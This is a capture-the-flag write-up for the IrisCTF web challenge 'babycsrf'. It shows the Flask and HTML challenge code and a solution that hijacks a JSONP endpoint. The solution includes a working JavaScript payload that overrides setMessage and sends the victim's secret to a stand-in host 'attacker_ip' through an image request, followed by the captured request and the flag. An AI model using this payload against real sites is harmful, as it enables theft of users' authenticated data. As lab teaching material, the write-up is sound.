# babycsrf (Web)

**Description**

*"JSONP is a old pattern for getting data into JS, but I heard it's insecure because an attacker can specify code instead of a function name. I solved this problem by not letting you change the name.
For this challenge you will need to submit a URL to the admin bot (a program that runs a browser and directs it to visit your URL, simulating a real person clicking your link). I recommend learning how to use ngrok if you don't know how to expose local solutions to the internet - I've also provided a template server using Python and Flask for your solution."*

**Challenge Code: chal.py**

```python
from flask import Flask, request

app = Flask(__name__)

with open("home.html") as home:
    HOME_PAGE = home.read()

@app.route("/")
def home():
    return HOME_PAGE

@app.route("/api")
def page():
    secret = request.cookies.get("secret", "EXAMPLEFLAG")
    return f"setMessage('irisctf{{{secret}}}');"

app.run(port=12345)
```

**Challenge Code: home.html**
```html
<!DOCTYPE html>
<html>
    <body>
        <h4>Welcome to my home page!</h4>
        Message of the day: <span id="message">(loading...)</span>
        <script>
        window.setMessage = (m) => {
         document.getElementById("message").innerText = m;
}
    window.onload = () => {
    s = document.createElement("script");
    s.src = "/api";
    document.body.appendChild(s);
}
        </script>
    </body>
</html>
```

**Solution**

The challenge provides a JSONP API endpoint.

```python
@app.route("/api")
def page():
    secret = request.cookies.get("secret", "EXAMPLEFLAG")
    return f"setMessage('irisctf{{{secret}}}');"
```

I read up on JSONP and learned that it is dangerous because it is vulnerable to CSRF attacks and can be used to bypass the browser's SOP.
A page with malicious code can override functions of the victim.
To get the flag I started two python webservers.
The first one which provides the malicious code and whose URL I give to the admin bot and another one which receives the flag via GET request.

**1.** `$python3 -m http.server 1234` - Server with our malicious code.

```html
<script>
                    var target="http://attacker_ip:9876/catch";
                    function setMessage(o){
                    var ref = o;
                        var inner = function() {
                            var response = "";

                        for(var x in ref ) {
                           response += ref[x] + "";
                        }
                        new Image().src=target +escape(response);
                    };
                    setTimeout(inner,100);
                    }
                </script>
                <script src="https://babycsrf-web.chal.irisc.tf/api">
</script>
```

**2.** `$python3 -m http.server 9876` - Server that receives our flag.

Now we give the admin-bot the URL of our first server and get our flag in the GET request on the second server.

`GET /catchirisctf%7Bjsonp_is_never_the_answer%7D HTTP/1.1" 404 -`

`isctf{jsonp_is_never_the_answer}`


